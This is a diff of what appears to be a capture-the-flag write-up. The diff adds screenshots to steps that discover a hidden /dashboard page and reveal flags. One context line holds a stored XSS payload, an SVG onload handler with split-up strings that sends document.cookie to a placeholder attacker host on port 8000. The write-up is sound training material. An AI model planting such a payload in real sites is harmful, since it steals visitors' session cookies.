@@ -40,6 +40,7 @@ Open the main page:
 ```text id="1o1q0v"
 http://192.168.1.8:3075/
 ```
+
 <img width="843" height="220" alt="image" src="https://github.com/user-attachments/assets/c20c1d30-47a3-476c-923f-15af5eb6556b" />
 
 Using a browser:
@@ -78,6 +79,7 @@ Based on common web application structures, the attacker guesses the administrat
 ```text id="wlw30v"
 /dashboard
 ```
+
 <img width="824" height="492" alt="image" src="https://github.com/user-attachments/assets/169c9f1a-786e-4c7e-9001-20b9f0440e54" />
 
 🎯 Flag Revealed:
@@ -204,6 +206,7 @@ The attacker launches a Python HTTP Server on their laptop (port 8000) as a list
 <svg onload="fetch('http://<ATTACKER_IP>:8000/?c='+window['docu'+'ment']['coo'+'kie'])">
 ```
 
+<img width="1055" height="539" alt="image" src="https://github.com/user-attachments/assets/a7624d33-4321-47e6-b923-203bb261dfb8" />
 
 🎯 Transfer Mechanism Flag:
 
